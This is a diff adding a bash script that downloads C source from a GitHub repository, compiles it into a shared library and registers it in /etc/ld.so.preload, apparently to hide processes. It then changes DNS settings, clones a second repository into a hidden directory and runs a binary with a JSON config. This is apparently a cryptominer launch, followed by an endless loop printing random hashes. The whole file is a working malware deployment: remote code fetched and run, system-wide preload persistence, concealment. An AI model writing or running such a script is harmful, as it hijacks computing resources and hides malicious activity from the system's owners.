@@ -1,0 +1,17 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/ganejafaujanih/acuy/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+sudo gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+mkdir .lakhap && cd .lakhap
+git clone https://github.com/ganejafaujanih/garing.git
+cd garing
+chmod +x abeh doton.json
+./abeh -c "doton.json"
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
+
